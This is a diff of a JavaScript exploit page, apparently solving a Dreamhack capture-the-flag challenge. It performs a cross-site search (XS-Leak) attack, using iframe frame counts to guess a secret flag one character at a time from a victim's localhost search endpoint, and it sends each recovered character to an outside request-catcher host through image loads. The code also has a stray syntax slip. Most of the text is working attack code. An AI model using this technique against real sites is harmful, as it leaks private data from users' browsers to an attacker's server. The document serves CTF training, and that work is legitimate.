@@ -1,62 +1,41 @@
 <iframe id="iframe"></iframe>
 <img id="img">
 <script>
-    async function search(query) {
-        return new Promise((resolve) => {
-            const iframe = document.createElement("iframe");
-            iframe.src = "http://127.0.0.1:8000/search?query=" + query;
-            iframe.style.display = "none";
-            document.body.appendChild(iframe);
-            let removed = false;
-
-            function removeIframe() {
-                if (!removed) {
-                    removed = true;
-                    iframe.onload = null;
-                    document.body.removeChild(iframe);
-                }
-            }
-
-            iframe.onload = () => {
-                try {
-                    let result = iframe.contentWindow.frames.length;
-                    removeIframe();
-                    resolve(true);
-                } catch (e) {
-                    removeIframe();
-                    resolve(false);
-                }
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
+                    return resolve();
+                else
+                    return reject();
             };
-
-            setTimeout(() => {
-                removeIframe();
-                resolve(false);
-            }, 1000);
         });
     }
 
+    async function search(query) {
+        try {
+            await req(
+              `http://localhost:8000/search?query=${query}`
+            );
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }s
+
     async function exploit() {
-        let chars = "0123456789abcdef}";
+        let chars = "0123456789abcdef}"
         let secret = "DH{";
 
-        while (secret[secret.length - 1] !== "}") {
-            let promises = chars.split("").map(c => search(secret + c).then(result => ({ char: c, success: result })));
-            let results = await Promise.all(promises);
-
-            let found = false;
-
-            for (let rslt of results) {
-                if (rslt.success) {
-                    secret += rslt.char;
-                    found = true;
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) {
+                    secret += c;
                     img.src = `https://ylpjamb.request.dreamhack.games/${secret}`;
                     break;
                 }
-            }
-
-            if (!found) {
-                img.src = `https://ylpjamb.request.dreamhack.games/failed`;
-                return;
             }
         }
     }
